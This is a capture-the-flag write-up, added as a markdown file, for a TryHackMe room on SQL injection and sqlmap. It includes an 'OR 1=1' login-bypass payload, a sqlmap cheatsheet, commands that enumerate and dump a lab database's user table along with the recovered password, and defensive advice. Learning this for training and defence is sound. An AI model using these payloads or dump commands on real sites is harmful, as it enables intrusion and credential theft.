@@ -1,0 +1,169 @@
+# SQLMap: The Basics — TryHackMe
+
+> Learn about SQL injection and exploit this vulnerability through the SQLMap tool.
+
+**Room:** https://tryhackme.com/room/sqlmapthebasics  
+**Difficulty:** Easy  
+**Category:** Offensive Security Tooling  
+**Completed:** 12 June 2026
+
+---
+
+## Summary
+
+This room covers SQL injection fundamentals and how to automate the exploitation process using SQLMap. The practical task involved exploiting a login page vulnerable to SQL injection to extract database names, table names, and user credentials from a MySQL database.
+
+## Tools Used
+
+- `sqlmap` — automated SQL injection tool
+- Browser DevTools — capturing GET request URL with parameters
+
+---
+
+## Key Concepts
+
+### What is SQL Injection?
+
+When a web application passes user input directly to a database query without sanitisation, an attacker can inject their own SQL commands.
+
+**Normal login query:**
+```sql
+SELECT * FROM users WHERE username = 'John' AND password = 'correct';
+```
+
+**Injected query:**
+```sql
+SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -
+```
+
+| Part | Result |
+|------|--------|
+| `password = 'abc'` | ❌ False |
+| `OR 1=1` | ✅ Always true |
+| `-- -` | Comments out rest of query |
+
+**Result → Login succeeds without knowing the password!**
+
+---
+
+### SQL Injection Types
+
+| Type | How it works |
+|------|-------------|
+| **Boolean-based blind** | Modifies query with boolean expression (1=1) |
+| **Error-based** | Intentionally generates errors containing data |
+| **Time-based blind** | Uses SLEEP() to infer data from response time |
+| **UNION query** | Appends extra SELECT to retrieve data |
+
+---
+
+### SQLMap Cheatsheet
+
+| Goal | Command |
+|------|---------|
+| Test URL for SQLi | `sqlmap -u <URL>` |
+| Get all databases | `sqlmap -u <URL> --dbs` |
+| Get tables from DB | `sqlmap -u <URL> -D <database> --tables` |
+| Dump table data | `sqlmap -u <URL> -D <database> -T <table> --dump` |
+| Test POST request | `sqlmap -r request.txt` |
+| Beginner mode | `sqlmap --wizard` |
+| Deep scan | add `--level=5` |
+
+---
+
+## Task 4 — Practical Exercise
+
+**Target:** `http://10.145.135.211`  
+**Vulnerable URL:** `http://10.145.135.211/ai/includes/user_login?email=test&password=test`
+
+### Step 1 — Enumerate Databases
+
+```bash
+sqlmap -u 'http://10.145.135.211/ai/includes/user_login?email=test&password=test' --dbs --level=5
+```
+
+**Output:**
+```
+available databases [6]:
+[*] ai
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+```
+
+**Q1 Answer: 6 databases** ✅
+
+---
+
+### Step 2 — Enumerate Tables in "ai" Database
+
+```bash
+sqlmap -u 'http://10.145.135.211/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5
+```
+
+**Output:**
+```
+Database: ai
+[1 table]
++------+
+| user |
++------+
+```
+
+**Q2 Answer: user** ✅
+
+---
+
+### Step 3 — Dump the "user" Table
+
+```bash
+sqlmap -u 'http://10.145.135.211/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5
+```
+
+Found credentials for `test@chatai.com`
+
+**Q3 Answer: 12345678** ✅
+
+---
+
+## SQLMap Attack Flow
+
+```
+Find URL with GET parameter
+         ↓
+sqlmap -u <URL> --dbs        → get database names
+         ↓
+sqlmap -D <db> --tables      → get table names
+         ↓
+sqlmap -D <db> -T <table> --dump → get data!
+```
+
+---
+
+## Lessons Learned
+
+- URLs with GET parameters (e.g. `?cat=1`) are prime SQLi targets
+- Always use `--level=5` for deeper scans when basic scan fails
+- SQLMap remembers previous results — subsequent commands run faster
+- `OR 1=1` is always true — the core of most SQLi bypass attacks
+- Single quote `'` is used to break out of the SQL string context
+- `-- -` comments out the rest of the query after injection
+
+## Defender's Perspective
+
+- Use **parameterised queries** / prepared statements — never concatenate user input
+- Implement **input validation** — whitelist expected input formats
+- Deploy a **WAF** (Web Application Firewall) to detect SQLi patterns
+- Use **least privilege** database accounts — don't run apps as root DB user
+- **Never store plaintext passwords** — hash with bcrypt/argon2
+- Enable **database activity monitoring** to detect unusual queries
+
+---
+
+## References
+
+- https://tryhackme.com/room/sqlmapthebasics
+- https://sqlmap.org
+- https://owasp.org/www-community/attacks/SQL_Injection
